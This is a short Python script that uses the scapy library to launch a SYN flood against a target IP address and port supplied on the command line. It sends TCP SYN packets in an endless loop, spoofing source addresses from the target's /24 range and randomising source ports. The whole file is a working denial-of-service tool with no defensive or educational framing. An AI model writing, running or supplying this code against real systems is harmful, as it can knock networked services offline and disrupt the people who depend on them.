from scapy.all import *
import optparse

def SYN_flood():
	ip = IP(src=RandIP(target_ip+"/24"),dst=target_ip)
	tcp = TCP(sport=RandShort(), dport=int(target_port))
	packet = ip / tcp
	send(packet, loop=1, verbose=0)

#parsing user input as command line args
parser = optparse.OptionParser()

parser.add_option("-t", "--target", dest="target_ip", help="set target's ip")
parser.add_option("-p", "--port", dest="target_port", help="set target's port")

(options, arguments) = parser.parse_args()
target_ip = options.target_ip
target_port = options.target_port
SYN_flood()
